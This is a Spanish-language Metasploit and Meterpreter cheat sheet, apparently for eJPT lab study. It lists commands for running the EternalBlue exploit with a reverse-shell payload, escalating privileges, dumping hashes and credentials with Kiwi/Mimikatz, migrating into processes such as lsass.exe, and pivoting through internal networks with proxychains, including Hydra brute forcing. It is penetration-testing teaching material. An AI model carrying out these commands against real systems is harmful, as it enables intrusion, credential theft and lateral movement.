# Metasploit Framework & Meterpreter Cheat Sheet

Guía rápida para la gestión de sesiones en Metasploit, comandos de Meterpreter y técnicas de pivoting mediante `autoroute` y `socks_proxy`.

---

## 1. Uso Básico de Msfconsole

### Inicio y Gestión de Espacios de Trabajo (Workspaces)
```bash
# Iniciar consola en modo silencioso
msfconsole -q

# Listar espacios de trabajo
workspace

# Crear y cambiar a un nuevo workspace
workspace -a ejpt_lab

# Cambiar entre workspaces
workspace target_net
```

### Búsqueda y Selección de Módulos
```text
# Buscar exploits o auxiliares (ej. por CVE o servicio)
search type:exploit name:smb
search cve:2017-0144

# Seleccionar un módulo
use exploit/windows/smb/ms17_010_eternalblue

# Mostrar información y opciones requeridas
info
show options
show missing

# Configuración de parámetros
set RHOSTS 10.10.10.100
set LHOST 10.10.14.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ejecutar el exploit (opción -j para segundo plano)
exploit -j
run -j
```

### Gestión de Sesiones
```text
# Listar todas las sesiones activas
sessions -l

# Interactuar con una sesión específica
sessions -i 1

# Pasar una sesión simple (shell) a Meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

---

## 2. Comandos Clave en Meterpreter

Una vez dentro de una sesión interactiva de Meterpreter:

### Reconocimiento de Sistema e Identidad
```text
sysinfo             # Información del sistema operativo y arquitectura
getuid              # Usuario actual ejecutando el proceso
getprivs            # Mostrar privilegios habilitados del token actual
ipconfig / ifconfig # Mostrar interfaces de red e IPs del objetivo
netstat             # Mostrar conexiones de red activas
```

### Escalada de Privilegios y Extracción de Credenciales
```text
getsystem           # Intento de escalada automática a NT AUTHORITY\SYSTEM (Windows)
hashdump            # Extraer hashes NTLM del registro SAM (requiere SYSTEM)
load kiwi           # Cargar la extensión de Mimikatz en memoria
creds_all           # Extraer credenciales y hashes con Kiwi/Mimikatz
```

### Gestión de Procesos y Migración (OPSEC / Estabilidad)
```text
ps                  # Listar procesos en ejecución
getpid              # Ver el PID del proceso actual donde estamos inyectados
migrate <PID>       # Migrar la sesión a otro proceso estable (ej. explorer.exe o lsass.exe)
```

### Manipulación de Archivos
```text
pwd / ls            # Navegar por el sistema de archivos remoto
download <REMOTE>   # Descargar archivo del objetivo a la máquina atacante
upload <LOCAL>      # Subir archivo local a la máquina objetivo
search -f *.txt     # Buscar archivos específicos en el sistema remoto
```

### Interacción con la Consola del Sistema
```text
shell               # Abrir una shell de comandos nativa (cmd.exe / bash)
# (Para salir de la shell nativa y volver a Meterpreter: exit)
```

---

## 3. Pivoting con Metasploit

Técnica para acceder a subredes internas no alcanzables directamente utilizando una máquina comprometida como salto.

```
[Atacante] ---> (Red Externa) ---> [Víctima 1 (Comprometida)] ---> (Red Interna 192.168.1.0/24) ---> [Víctima 2]
```

---

### Paso A: Configuración de Rutas con `autoroute`

Agrega rutas en la tabla de enrutamiento interna de Metasploit para encaminar el tráfico hacia la red interna a través de la sesión de Meterpreter.

#### Opción 1: Módulo Post (`autoroute`)
```text
# Poner la sesión actual de Meterpreter en segundo plano (Ctrl+Z o comando bg)
background

# Cargar el módulo de autoroute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run
```

#### Opción 2: Desde la propia consola Meterpreter
```text
meterpreter » run autoroute -s 192.168.1.0/24
meterpreter » run autoroute -p                 # Listar rutas activas en Metasploit
```

---

### Paso B: Servidor Proxy SOCKS (`socks_proxy`)

Permite utilizar herramientas externas a Metasploit (ej. Nmap, Gobuster, Hydra, navegador web) enviando su tráfico a través de la red pivoting mediante `proxychains`.

#### 1. Configurar el módulo auxiliar en Metasploit:
```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5a                  # O SOCKS4a / 5 según necesidad
run -j
```

#### 2. Configurar `/etc/proxychains4.conf` en Linux:
Asegurarse de que al final del archivo `/etc/proxychains4.conf` de la máquina atacante esté definida la línea del proxy:

```ini
[ProxyList]
# socks4 127.0.0.1 1080
socks5 127.0.0.1 1080
```

#### 3. Ejecución de herramientas externas a través del túnel:
```bash
# Escaneo de puertos en la red interna a través del proxy
proxychains4 nmap -sT -Pn -p 80,445,3389 192.168.1.50

# Conexión web o fuerza bruta a máquinas internas
proxychains4 hydra -l admin -P rockyou.txt 192.168.1.50 ssh
proxychains4 firefox 192.168.1.50
```

> [!NOTE]
> En escaneos Nmap con `proxychains`, utilizar siempre el escaneo TCP connect (`-sT`) y desactivar ping (`-Pn`), ya que ICMP y SYN scan no son soportados por proxies SOCKS.
